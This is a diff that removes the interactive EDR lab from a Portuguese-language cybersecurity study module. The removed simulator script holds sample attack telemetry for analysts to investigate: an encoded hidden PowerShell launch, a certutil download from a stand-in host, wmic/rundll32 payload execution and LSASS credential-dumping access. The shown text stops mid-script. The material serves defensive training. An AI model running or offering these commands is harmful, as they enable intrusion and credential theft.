@@ -79,8 +79,6 @@
   /* Tipos de seção */
   --tipo-teoria: #2563EB;
   --tipo-teoria-bg: #EFF5FF;
-  --tipo-laboratorio: #0D9488;
-  --tipo-laboratorio-bg: #ECFDF8;
   --tipo-checklist: #B45309;
   --tipo-checklist-bg: #FFF8EB;
   --tipo-questoes: #C026D3;
@@ -168,8 +166,6 @@
     /* Tipos de seção */
     --tipo-teoria: #60A5FA;
     --tipo-teoria-bg: rgba(96, 165, 250, 0.10);
-    --tipo-laboratorio: #2DD4BF;
-    --tipo-laboratorio-bg: rgba(45, 212, 191, 0.09);
     --tipo-checklist: #FBBF24;
     --tipo-checklist-bg: rgba(251, 191, 36, 0.09);
     --tipo-questoes: #E879F9;
@@ -241,8 +237,6 @@
   /* Tipos de seção */
   --tipo-teoria: #60A5FA;
   --tipo-teoria-bg: rgba(96, 165, 250, 0.10);
-  --tipo-laboratorio: #2DD4BF;
-  --tipo-laboratorio-bg: rgba(45, 212, 191, 0.09);
   --tipo-checklist: #FBBF24;
   --tipo-checklist-bg: rgba(251, 191, 36, 0.09);
   --tipo-questoes: #E879F9;
@@ -313,8 +307,6 @@
   /* Tipos de seção */
   --tipo-teoria: #2563EB;
   --tipo-teoria-bg: #EFF5FF;
-  --tipo-laboratorio: #0D9488;
-  --tipo-laboratorio-bg: #ECFDF8;
   --tipo-checklist: #B45309;
   --tipo-checklist-bg: #FFF8EB;
   --tipo-questoes: #C026D3;
@@ -365,9 +357,8 @@
 /* ==========================================================================
    ESTUDOS DE CIBERSEGURANÇA — COMPONENTES (base.css)
    Visual "editorial técnico" do mockup de módulo aprovado: sumário lateral,
-   seções tipadas e placas console em terminal, laboratório e diagrama.
-   Os tokens vêm de tokens.css (embutido antes); as regras internas dos
-   simuladores vêm de laboratorio.css (embutido depois).
+   seções tipadas e placas console em terminal e diagrama.
+   Os tokens vêm de tokens.css (embutido antes).
    Tipografia: Barlow Semi Condensed, IBM Plex Sans, IBM Plex Mono.
    ========================================================================== */
 
@@ -876,7 +867,6 @@ summary:focus-visible,
    6. Seção tipada (.study-section[data-tipo] + .shead)
    -------------------------------------------------------------------------- */
 [data-tipo="teoria"] { --c: var(--tipo-teoria); --soft: var(--tipo-teoria-bg); }
-[data-tipo="laboratorio"] { --c: var(--tipo-laboratorio); --soft: var(--tipo-laboratorio-bg); }
 [data-tipo="checklist"] { --c: var(--tipo-checklist); --soft: var(--tipo-checklist-bg); }
 [data-tipo="questoes"] { --c: var(--tipo-questoes); --soft: var(--tipo-questoes-bg); }
 [data-tipo="referencias"] { --c: var(--tipo-referencias); --soft: var(--tipo-referencias-bg); }
@@ -1129,63 +1119,6 @@ td {
   height: auto;
   display: inline-block;
   margin: 0 auto;
-}
-
-/* --------------------------------------------------------------------------
-   11. Laboratório (.lab-box): cabeçalho console + corpo claro.
-       Controles e saída internos ficam em laboratorio.css.
-   -------------------------------------------------------------------------- */
-.lab-box {
-  background: var(--surface);
-  border: 1px solid color-mix(in srgb, var(--tipo-laboratorio) 35%, var(--rule));
-  border-radius: var(--radius-lg);
-  overflow: hidden;
-  margin: 18px 0;
-  box-shadow: var(--shadow-sm);
-}
-
-/* Tokens de texto redefinidos na placa: estilos inline dos corpos que usam
-   var(--ink) e var(--muted) continuam legíveis sobre o fundo console. */
-.lab-header {
-  --ink: #F1F7FA;
-  --muted: #9FB3C1;
-  background: var(--console);
-  color: var(--console-ink);
-  padding: 14px 18px;
-}
-
-.lab-header::before {
-  content: "// laboratório interativo";
-  display: block;
-  font: 500 11px var(--font-mono);
-  letter-spacing: 0.04em;
-  color: #2DD4BF;
-}
-
-.lab-header h3, .lab-header h4 {
-  font: 700 19px/1.25 var(--font-display);
-  color: #F1F7FA;
-  margin: 2px 0;
-}
-
-.lab-header p {
-  margin: 0;
-  font-size: 13px;
-  color: #9FB3C1;
-}
-
-.lab-header .lab-badge {
-  display: inline-block;
-  font: 500 11px var(--font-mono);
-  border: 1px solid #2DD4BF;
-  color: #2DD4BF;
-  border-radius: var(--radius-sm);
-  padding: 2px 8px;
-  margin-top: 4px;
-}
-
-.lab-body {
-  padding: 18px;
 }
 
 /* --------------------------------------------------------------------------
@@ -1692,7 +1625,6 @@ td {
   .mhead h1 { font-size: 27px; }
   .shead h2 { font-size: 22px; }
   .roadmap { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-  .lab-body { padding: 14px; }
   .quiz-filtros { margin-left: 0; }
   .study-done { flex-direction: column; align-items: stretch; }
   .study-done .btn-concluir { width: 100%; }
@@ -1725,7 +1657,7 @@ td {
     max-width: 100% !important;
     padding: 0 !important;
   }
-  .mhead, .lab-box, .checklist, .quiz-item, .quiz-section {
+  .mhead, .checklist, .quiz-item, .quiz-section {
     border: 1px solid #CCC !important;
     box-shadow: none !important;
     break-inside: avoid;
@@ -1781,322 +1713,6 @@ dfn.glossario:focus-visible {
   font-weight: 600;
 }
 
-/* ==========================================================================
-   ESTUDOS DE CIBERSEGURANÇA — LABORATÓRIO (laboratorio.css)
-   Regras internas dos simuladores, preservadas do base.css anterior ao
-   redesenho (commit a671fbe, §8 e §9) para que os 57 laboratórios continuem
-   com a mesma aparência. A moldura (.lab-box, .lab-header, .lab-body) é do
-   novo design e fica em base.css. Embutido por montar.py depois de base.css.
-   ========================================================================== */
-
-/* --------------------------------------------------------------------------
-   1. Controles e saída do simulador (.lab-controls, .lab-output)
-   -------------------------------------------------------------------------- */
-.lab-controls {
-  display: flex;
-  flex-wrap: wrap;
-  align-items: center;
-  gap: 1rem;
-  margin-bottom: 1.25rem;
-  background-color: var(--ground);
-  padding: 1rem;
-  border-radius: var(--radius-md);
-  border: 1px solid var(--rule);
-}
-
-.lab-controls > * {
-  min-width: 0;
-  max-width: 100%;
-}
-
-.lab-controls label {
-  font-size: 0.9rem;
-  font-weight: 600;
-  color: var(--ink);
-  display: inline-flex;
-  align-items: center;
-  gap: 0.4rem;
-}
-
-.lab-controls input[type="text"],
-.lab-controls input[type="number"],
-.lab-controls select,
-.lab-controls textarea {
-  background-color: var(--surface);
-  color: var(--ink);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.45rem 0.75rem;
-  font-family: var(--font-mono);
-  font-size: 0.9rem;
-  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
-}
-
-.lab-controls input:focus,
-.lab-controls select:focus,
-.lab-controls textarea:focus {
-  outline: none;
-  border-color: var(--t1-blue);
-  box-shadow: 0 0 0 3px var(--accent-soft);
-}
-
-.lab-output {
-  background-color: var(--console);
-  color: #38BDF8;
-  font-family: var(--font-mono);
-  font-size: 0.88rem;
-  padding: 1.25rem;
-  border-radius: var(--radius-md);
-  border: 1px solid #1E293B;
-  min-height: 100px;
-  max-height: 400px;
-  overflow-y: auto;
-  white-space: pre-wrap;
-  word-break: break-all;
-  line-height: 1.55;
-}
-
-/* --------------------------------------------------------------------------
-   2. Controles e grade do laboratório interativo
-   -------------------------------------------------------------------------- */
-.lab-controls-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-  gap: 1.25rem;
-  padding: 1.5rem;
-  background-color: var(--ground);
-  border-bottom: 1px solid var(--rule);
-}
-
-.form-group {
-  display: flex;
-  flex-direction: column;
-  gap: 0.4rem;
-}
-
-.form-group.full-width {
-  grid-column: 1 / -1;
-}
-
-.form-group label {
-  font-size: 0.88rem;
-  font-weight: 600;
-  color: var(--ink);
-}
-
-.form-control {
-  background-color: var(--surface);
-  color: var(--ink);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.55rem 0.85rem;
-  font-family: var(--font-mono);
-  font-size: 0.9rem;
-  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
-}
-
-.form-control:focus {
-  outline: none;
-  border-color: var(--t1-blue);
-  box-shadow: 0 0 0 3px var(--accent-soft);
-}
-
-.form-range {
-  width: 100%;
-  accent-color: var(--t1-blue);
-  cursor: pointer;
-}
-
-.flags-btn-group {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 0.6rem;
-  margin-top: 0.25rem;
-}
-
-.flag-toggle {
-  display: inline-flex;
-  align-items: center;
-  gap: 0.4rem;
-  background-color: var(--surface);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.35rem 0.75rem;
-  font-family: var(--font-mono);
-  font-size: 0.85rem;
-  font-weight: 600;
-  cursor: pointer;
-  user-select: none;
-  transition: all var(--transition-fast);
-}
-
-.flag-toggle:hover {
-  border-color: var(--t1-blue);
-}
-
-.flag-toggle input[type="checkbox"] {
-  accent-color: var(--t1-blue);
-  cursor: pointer;
-}
-
-.lab-actions-bar {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 0.75rem;
-  padding: 1.25rem 1.5rem;
-  background-color: var(--surface);
-  border-bottom: 1px solid var(--rule);
-}
-
-.packet-display-wrap {
-  padding: 1.5rem;
-  background-color: var(--surface);
-}
-
-.packet-display-wrap h4 {
-  margin-top: 0;
-  margin-bottom: 1rem;
-  font-size: 1.05rem;
-  color: var(--ink);
-}
-
-.packet-header-grid {
-  display: grid;
-  grid-template-columns: repeat(32, 1fr);
-  gap: 4px;
-  background-color: var(--ground);
-  padding: 0.75rem;
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-md);
-  overflow-x: auto;
-}
-
-.header-field-cell {
-  background-color: var(--surface);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.5rem 0.6rem;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  min-width: 75px;
-}
-
-.header-field-cell.span-8 {
-  grid-column: span 8;
-}
-
-.header-field-cell.span-16 {
-  grid-column: span 16;
-}
-
-.header-field-cell.span-32 {
-  grid-column: span 32;
-}
-
-.header-field-cell .field-title {
-  font-size: 0.72rem;
-  font-family: var(--font-mono);
-  color: var(--muted);
-  text-transform: uppercase;
-  letter-spacing: 0.04em;
-  margin-bottom: 0.2rem;
-}
-
-.header-field-cell .field-val {
-  font-size: 0.88rem;
-  font-family: var(--font-mono);
-  font-weight: 600;
-  color: var(--ink);
-}
-
-.header-field-cell .field-val.highlight {
-  color: var(--t1-blue);
-}
-
-.header-field-cell .field-val.flag-badge {
-  background-color: var(--sunk);
-  padding: 0.15rem 0.45rem;
-  border-radius: var(--radius-sm);
-  font-size: 0.8rem;
-}
-
-@media (max-width: 768px) {
-  .packet-header-grid {
-    grid-template-columns: repeat(16, 1fr);
-  }
-  .header-field-cell.span-8 {
-    grid-column: span 16;
-  }
-}
-
-.edr-grid-container {
-  grid-template-columns: 1fr 1fr;
-}
-
-/* --------------------------------------------------------------------------
-   3. Botões e controles padrão
-   -------------------------------------------------------------------------- */
-.btn-primary {
-  background-color: var(--t1-blue);
-  color: #FFFFFF;
-  border: none;
-  border-radius: var(--radius-md);
-  padding: 0.55rem 1.15rem;
-  font-family: var(--font-body);
-  font-size: 0.92rem;
-  font-weight: 600;
-  cursor: pointer;
-  transition: background-color var(--transition-fast), transform var(--transition-fast);
-  display: inline-flex;
-  align-items: center;
-  gap: 0.4rem;
-}
-
-.btn-primary:hover {
-  filter: brightness(1.1);
-  transform: translateY(-1px);
-}
-
-.btn-primary:active {
-  transform: translateY(0);
-}
-
-.btn-secondary {
-  background-color: var(--sunk);
-  color: var(--ink);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-md);
-  padding: 0.55rem 1.15rem;
-  font-family: var(--font-body);
-  font-size: 0.92rem;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all var(--transition-fast);
-}
-
-.btn-secondary:hover {
-  background-color: var(--surface);
-  border-color: var(--muted);
-}
-
-/* --------------------------------------------------------------------------
-   4. Celular e impressão
-   -------------------------------------------------------------------------- */
-@media (max-width: 640px) {
-  .lab-controls { flex-direction: column; align-items: stretch; }
-  .btn { overflow-wrap: anywhere; }
-  .edr-grid-container { grid-template-columns: minmax(0, 1fr); }
-}
-
-@media print {
-  .lab-controls button {
-    display: none !important;
-  }
-}
-
   </style>
 </head>
 <body data-slug="Seguranca-em-Endpoints-EDR">
@@ -2120,7 +1736,6 @@ dfn.glossario:focus-visible {
   <ol class="toc-lista">
     <li><a class="toc-item" href="#introducao" data-tipo="teoria"><span class="toc-icone">📘</span><span><span class="toc-tipo">Teoria</span><span class="toc-titulo">Introdução e Contexto Prático: O Endpoint Como Última Fronteira</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#telemetria" data-tipo="teoria"><span class="toc-icone">📘</span><span><span class="toc-tipo">Teoria</span><span class="toc-titulo">Telemetria de Host e Árvores de Processos</span></span><span class="toc-contador"></span></a></li>
-    <li><a class="toc-item" href="#simulador" data-tipo="laboratorio"><span class="toc-icone">🧪</span><span><span class="toc-tipo">Laboratório</span><span class="toc-titulo">Laboratório Prático: Console de Detecção & Resposta EDR</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#checklist" data-tipo="checklist"><span class="toc-icone">☑️</span><span><span class="toc-tipo">Checklist</span><span class="toc-titulo">Checklist de Auditoria e Implantação de EDR</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#quiz" data-tipo="questoes"><span class="toc-icone">❓</span><span><span class="toc-tipo">Questões de concurso</span><span class="toc-titulo">Questões de Fixação e Concursos</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#fatos" data-tipo="referencias"><span class="toc-icone">📚</span><span><span class="toc-tipo">Referências</span><span class="toc-titulo">Fatos Essenciais e Conclusão da Trilha 2</span></span><span class="toc-contador"></span></a></li>
@@ -2136,14 +1751,14 @@ dfn.glossario:focus-visible {
   <h1>Antivírus, EDR/XDR e Proteção de Host</h1>
   <p class="mhead-sub">Telemetria comportamental de processos, detecção de técnicas evasivas e contenção de hosts</p>
   <div class="chips"><span class="chip">⏱ 45 min</span><span class="chip">📈 Intermediário</span><span class="chip">🛡 NIST Protect / Detect</span><span class="chip">🎯 ATT&amp;CK TA0002 Execution / TA0005 Defense Evasion</span><span class="chip">👤 Blue Team &amp; Defesa · Operações SOC &amp; Resposta · Perícia Forense &amp; Malware · Analista de Segurança da Informação</span></div>
-  <nav class="roadmap" aria-label="Mapa do módulo"><a href="#introducao" data-tipo="teoria"><span class="toc-tipo">Teoria</span>2 seções</a><a href="#simulador" data-tipo="laboratorio"><span class="toc-tipo">Laboratório</span></a><a href="#checklist" data-tipo="checklist"><span class="toc-tipo">Checklist</span>6 itens</a><a href="#quiz" data-tipo="questoes"><span class="toc-tipo">Questões de concurso</span>3 questões</a><a href="#fatos" data-tipo="referencias"><span class="toc-tipo">Referências</span></a></nav>
+  <nav class="roadmap" aria-label="Mapa do módulo"><a href="#introducao" data-tipo="teoria"><span class="toc-tipo">Teoria</span>2 seções</a><a href="#checklist" data-tipo="checklist"><span class="toc-tipo">Checklist</span>6 itens</a><a href="#quiz" data-tipo="questoes"><span class="toc-tipo">Questões de concurso</span>3 questões</a><a href="#fatos" data-tipo="referencias"><span class="toc-tipo">Referências</span></a></nav>
 </header>
 <!-- Estudo 10: Seguranca-em-Endpoints-EDR Body Fragment -->
 <article class="study-container" data-slug="seguranca-endpoints-edr">
 
     <!-- SEÇÃO 1: INTRODUÇÃO E CONTEXTO PRÁTICO -->
     <section class="study-section" id="introducao" data-tipo="teoria">
-        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 1 de 6</small></span><h2>Introdução e Contexto Prático: O Endpoint Como Última Fronteira</h2></div>
+        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 1 de 5</small></span><h2>Introdução e Contexto Prático: O Endpoint Como Última Fronteira</h2></div>
 
         <p class="lead-text">
             No cenário de cibersegurança contemporâneo, o <strong>endpoint</strong> (estações de trabalho de colaboradores, servidores corporativos, instâncias em nuvem e containers) é o principal campo de batalha onde intrusões se consolidam. Mais de 90% das violações bem-sucedidas iniciam-se no host através de engenharia social (phishing), exploração de vulnerabilidades em navegadores ou uso de credenciais válidas obtidas por vazamento.
@@ -2218,7 +1833,7 @@ dfn.glossario:focus-visible {
 
     <!-- SEÇÃO 2: TELEMETRIA DE HOST E ÁRVORES DE PROCESSOS -->
     <section class="study-section" id="telemetria" data-tipo="teoria">
-        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 2 de 6</small></span><h2>Telemetria de Host e Árvores de Processos</h2></div>
+        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 2 de 5</small></span><h2>Telemetria de Host e Árvores de Processos</h2></div>
 
         <p class="lead-text">
             A pedra angular de qualquer agente de EDR é a sua capacidade de coletar <strong>telemetria de alta fidelidade</strong> em tempo de execução. Sem dados granulares do kernel e das chamadas de sistema (<em>syscalls</em>), analistas de SOC e motores de inteligência artificial são incapazes de distinguir atividade rotineira de um ataque furtivo.
@@ -2360,101 +1975,10 @@ dfn.glossario:focus-visible {
     </section>
 
     <!-- SEÇÃO 3: LABORATÓRIO / SIMULADOR INTERATIVO EDR -->
-    <section class="study-section" id="simulador" data-tipo="laboratorio">
-        <div class="shead"><span class="stype">🧪 Laboratório <small>· Seção 3 de 6</small></span><h2>Laboratório Prático: Console de Detecção & Resposta EDR</h2></div>
-
-        <p class="lead-text">
-            Assuma o papel de um Analista de Segurança Nível 2 (SOC/IR) operando a console de um EDR corporativo. Investigue a linha do tempo de telemetria, analise árvores de processos parent-child, identifique técnicas do MITRE ATT&CK e execute a contenção adequada antes que a organização sofra impacto destrutivo ou exfiltração de dados!
-        </p>
-
-        <div class="lab-box edr-lab" id="edr-lab">
-            <div class="lab-header">
-                <div>
-                    <span class="lab-badge">Simulador EDR & Telemetria</span>
-                    <h3 style="margin: 0.4rem 0 0.2rem 0;">Linha do Tempo de Telemetria e Contenção de Host</h3>
-                    <p style="margin: 0; font-size: 0.9rem; color: var(--muted);">Investigue eventos de kernel, detecte ameaças em tempo real e execute ações de contenção cirúrgica.</p>
-                </div>
-                <div class="lab-host-status">
-                    <span class="status-indicator-badge" id="host-network-badge" style="background: rgba(16, 185, 129, 0.2); color: #10B981; border: 1px solid #10B981; padding: 0.35rem 0.75rem; border-radius: 4px; font-weight: 700; font-size: 0.85rem;">
-                        ● HOST ONLINE (REDE ATIVA)
-                    </span>
-                </div>
-            </div>
-
-            <!-- Dados do Ativo Monitorado -->
-            <div style="background: var(--surface); padding: 1rem; border-radius: 6px; margin: 1.25rem 0; border: 1px solid var(--rule); display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; font-size: 0.85rem;">
-                <div><strong>Hostname:</strong> <span id="edr-host-name">WS-FINANCE-04</span></div>
-                <div><strong>Endereço IP:</strong> <span id="edr-host-ip">192.168.10.42</span></div>
-                <div><strong>Sistema Operacional:</strong> Windows 11 Enterprise 23H2</div>
-                <div><strong>Agente EDR:</strong> Ativo (Proteção Comportamental Habilitada)</div>
-            </div>
-
-            <!-- Seletor de Cenários -->
-            <div style="margin-bottom: 1.5rem;">
-                <label for="edr-cenario-select" style="display: block; font-weight: 600; margin-bottom: 0.5rem;">Selecione o Alerta / Cenário em Análise:</label>
-                <select id="edr-cenario-select" onchange="carregarCenarioEdr(this.value)" style="width: 100%; padding: 0.65rem 0.9rem; border-radius: 6px; border: 1px solid var(--rule); background: var(--surface); color: var(--ink); font-family: inherit; font-size: 0.95rem;">
-                    <option value="macro_c2_lsass">Cenário 1: Phishing Macro → PowerShell Obfuscado → C2 Beaconing → LSASS Dump (Crítico)</option>
-                    <option value="lolbin_certutil_wmi">Cenário 2: Abuso de LOLBin Certutil → Persistência WMI → Execução Furtiva (Alto)</option>
-                    <option value="ransomware_vssadmin">Cenário 3: Ransomware Pré-Criptografia: Exclusão de Volume Shadow Copies (Crítico)</option>
-                    <option value="falso_positivo_sccm">Cenário 4: Falso Positivo Operacional: Atualização Corporativa via SCCM (Informativo)</option>
-                </select>
-            </div>
-
-            <!-- Grid com Árvore de Eventos à Esquerda e Inspetor de Telemetria à Direita -->
-            <div style="display: grid; gap: 1.25rem; margin-bottom: 1.5rem;" class="edr-grid-container">
-                <!-- Coluna da Linha do Tempo de Eventos -->
-                <div>
-                    <h4 style="margin-top: 0; margin-bottom: 0.75rem; display: flex; justify-content: space-between; align-items: center;">
-                        <span>Linha do Tempo de Eventos</span>
-                        <span style="font-size: 0.8rem; color: var(--muted); font-weight: normal;">Clique em um evento para inspecionar</span>
-                    </h4>
-                    <div id="edr-events-list" style="display: flex; flex-direction: column; gap: 0.6rem; max-height: 480px; overflow-y: auto; padding-right: 0.3rem;">
-                        <!-- Injetado dinamicamente via JS -->
-                    </div>
-                </div>
-
-                <!-- Coluna do Inspetor de Detalhes de Telemetria -->
-                <div style="background: var(--surface); border: 1px solid var(--rule); border-radius: 6px; padding: 1.25rem; display: flex; flex-direction: column;">
-                    <h4 style="margin-top: 0; margin-bottom: 0.75rem; border-bottom: 1px solid var(--rule); padding-bottom: 0.5rem;">
-                        Inspetor de Telemetria Detalhada
-                    </h4>
-                    <div id="edr-inspector-content" style="flex: 1; font-size: 0.9rem; line-height: 1.5;">
-                        <p style="color: var(--muted);">Selecione um evento na linha do tempo para ver metadados de processo, hash, linha de comando e técnica MITRE ATT&CK.</p>
-                    </div>
-
-                    <!-- Controles de Ação de Resposta EDR -->
-                    <div style="margin-top: 1.25rem; padding-top: 1rem; border-top: 1px solid var(--rule);">
-                        <div style="font-size: 0.85rem; font-weight: 700; margin-bottom: 0.6rem; text-transform: uppercase; letter-spacing: 0.05em; color: var(--muted);">
-                            Ações de Resposta em Host (Remediação)
-                        </div>
-                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem;">
-                            <button id="btn-kill-proc" class="btn" style="background: #DC2626; color: #fff; font-size: 0.85rem; padding: 0.5rem;" onclick="finalizarProcesso()">
-                                🛑 Finalizar Processo (Kill PID)
-                            </button>
-                            <button id="btn-isolate-host" class="btn" style="background: #D97706; color: #fff; font-size: 0.85rem; padding: 0.5rem;" onclick="isolarHostRede()">
-                                🔒 Isolar Host da Rede
-                            </button>
-                            <button id="btn-collect-triage" class="btn btn-secondary" style="font-size: 0.85rem; padding: 0.5rem;" onclick="coletarPacoteForense()">
-                                📦 Coletar Pacote Forense
-                            </button>
-                            <button id="btn-reset-edr" class="btn btn-outline" style="font-size: 0.85rem; padding: 0.5rem;" onclick="resetarInvestigacao()">
-                                🔄 Reiniciar Cenário
-                            </button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Feedback da Avaliação do Analista -->
-            <div id="edr-feedback-panel" style="padding: 1rem; border-radius: 6px; background: var(--surface); border: 1px solid var(--rule); font-size: 0.9rem;">
-                <strong>Status da Investigação:</strong> Aguardando análise dos eventos e decisão operacional do analista.
-            </div>
-        </div>
-    </section>
-
+    
     <!-- SEÇÃO 4: CHECKLIST DE APLICAÇÃO PRÁTICA -->
     <section class="study-section" id="checklist" data-tipo="checklist">
-        <div class="shead"><span class="stype">☑️ Checklist <small>· Seção 4 de 6</small></span><h2>Checklist de Auditoria e Implantação de EDR</h2></div>
+        <div class="shead"><span class="stype">☑️ Checklist <small>· Seção 3 de 5</small></span><h2>Checklist de Auditoria e Implantação de EDR</h2></div>
 
         <p class="lead-text">
             Utilize este checklist operacional para garantir que os agentes de EDR, a telemetria do sistema operacional e as rotinas de contenção em endpoints corporativos estejam configurados de forma resiliente contra adulterações e evasões.
@@ -2502,7 +2026,7 @@ dfn.glossario:focus-visible {
 
     <!-- SEÇÃO 5: QUESTÕES DE FIXAÇÃO E CONCURSOS -->
     <section class="study-section" id="quiz" data-tipo="questoes">
-        <div class="shead"><span class="stype">❓ Questões de concurso <small>· Seção 5 de 6</small></span><h2>Questões de Fixação e Concursos</h2></div>
+        <div class="shead"><span class="stype">❓ Questões de concurso <small>· Seção 4 de 5</small></span><h2>Questões de Fixação e Concursos</h2></div>
 
         <p class="lead-text">
             Avalie seus conhecimentos com questões baseadas em cenários práticos de resposta a incidentes e provas de alto nível técnico:
@@ -2556,7 +2080,7 @@ dfn.glossario:focus-visible {
 
     <!-- SEÇÃO 6: FATOS ESSENCIAIS E CONCLUSÃO DA TRILHA -->
     <section class="study-section" id="fatos" data-tipo="referencias">
-        <div class="shead"><span class="stype">📚 Referências <small>· Seção 6 de 6</small></span><h2>Fatos Essenciais e Conclusão da Trilha 2</h2></div>
+        <div class="shead"><span class="stype">📚 Referências <small>· Seção 5 de 5</small></span><h2>Fatos Essenciais e Conclusão da Trilha 2</h2></div>
 
         <p class="lead-text">
             Parabéns! Com o estudo de EDR e Proteção de Endpoints, você conclui com sucesso todos os 5 módulos da <strong>Trilha 2: Segurança Defensiva</strong>!
@@ -2600,461 +2124,7 @@ dfn.glossario:focus-visible {
 
 </article>
 
-<!-- SCRIPT VANILLA DO SIMULADOR EDR -->
-<script>
-(function() {
-    // Definição dos cenários de telemetria
-    const CENARIOS_EDR = {
-        macro_c2_lsass: {
-            titulo: "Phishing Macro → PowerShell Obfuscado → C2 Beaconing → LSASS Dump",
-            severidade: "Crítica",
-            tipo: "malicioso",
-            recomendacao: "kill_and_isolate",
-            eventos: [
-                {
-                    id: 1,
-                    time: "10:14:02",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "WINWORD.EXE",
-                    pid: 4820,
-                    ppid: 1044,
-                    pai: "explorer.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\m.silva\\Downloads\\Fatura_Urgente.docm"',
-                    hash: "a4f891b9201a4e21...",
-                    mitre: "T1204.002 - User Execution: Malicious File",
-                    alerta: false
-                },
-                {
-                    id: 2,
-                    time: "10:14:05",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "cmd.exe",
-                    pid: 5104,
-                    ppid: 4820,
-                    pai: "WINWORD.EXE",
-                    user: "FINANCE\\m.silva",
-                    cmd: 'cmd.exe /c "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...=="',
-                    hash: "5b88301ec299...",
-                    mitre: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell",
-                    alerta: true
-                },
-                {
-                    id: 3,
-                    time: "10:14:06",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "powershell.exe",
-                    pid: 5912,
-                    ppid: 5104,
-                    pai: "cmd.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: 'powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...==',
-                    hash: "ee3b890f124c...",
-                    mitre: "T1059.001 - Command and Scripting Interpreter: PowerShell",
-                    alerta: true
-                },
-                {
-                    id: 4,
-                    time: "10:14:08",
-                    eid: 3,
-                    eidNome: "Network Connection (EID 3)",
-                    processo: "powershell.exe",
-                    pid: 5912,
-                    ppid: 5104,
-                    pai: "cmd.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: 'Socket TCP Estabelecido: 192.168.10.42:49821 -> 185.220.101.5:443 (C2 Host Externo)',
-                    hash: "ee3b890f124c...",
-                    mitre: "T1071.001 - Application Layer Protocol: Web Protocols (C2 Beaconing)",
-                    alerta: true
-                },
-                {
-                    id: 5,
-                    time: "10:14:15",
-                    eid: 10,
-                    eidNome: "Process Access (EID 10)",
-                    processo: "powershell.exe (Injeção)",
-                    pid: 5912,
-                    ppid: 5104,
-                    pai: "cmd.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: 'Target: C:\\Windows\\System32\\lsass.exe (Acesso Solicitado: 0x1010 PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)',
-                    hash: "ee3b890f124c...",
-                    mitre: "T1003.001 - OS Credential Dumping: LSASS Memory",
-                    alerta: true
-                }
-            ]
-        },
-        lolbin_certutil_wmi: {
-            titulo: "Abuso de LOLBin Certutil → Persistência WMI → Execução Furtiva",
-            severidade: "Alta",
-            tipo: "malicioso",
-            recomendacao: "kill_and_isolate",
-            eventos: [
-                {
-                    id: 1,
-                    time: "09:30:10",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "certutil.exe",
-                    pid: 3120,
-                    ppid: 2804,
-                    pai: "powershell.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: 'certutil.exe -urlcache -split -f http://evil-updates.cc/payload.b64 C:\\ProgramData\\payload.b64',
-                    hash: "3f9408bc8190...",
-                    mitre: "T1105 - Ingress Tool Transfer (LOLBin abuse)",
-                    alerta: true
-                },
-                {
-                    id: 2,
-                    time: "09:30:12",
-                    eid: 11,
-                    eidNome: "File Create (EID 11)",
-                    processo: "certutil.exe",
-                    pid: 3120,
-                    ppid: 2804,
-                    pai: "powershell.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: 'Arquivo Criado: C:\\ProgramData\\payload.b64 (Tamanho: 48.2 KB)',
-                    hash: "77a83d91c109...",
-                    mitre: "T1027 - Obfuscated Files or Information",
-                    alerta: true
-                },
-                {
-                    id: 3,
-                    time: "09:30:16",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
-                    processo: "wmic.exe",
-                    pid: 4012,
-                    ppid: 2804,
-                    pai: "powershell.exe",
-                    user: "FINANCE\\m.silva",
-                    cmd: 'wmic.exe process call create "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\payload.b64,Start"',
-                    hash: "bb892c900e...",
-                    mitre: "T1047 - Windows Management Instrumentation (WMI)",
-                    alerta: true
-                }
-            ]
-        },
-        ransomware_vssadmin: {
-            titulo: "Ransomware Pré-Criptografia: Exclusão de Volume Shadow Copies",
-            severidade: "Crítica",
-            tipo: "malicioso",
-            recomendacao: "kill_and_isolate",
-            eventos: [
-                {
-                    id: 1,
-                    time: "14:22:01",
-                    eid: 1,
-                    eidNome: "Process Create (EID 1)",
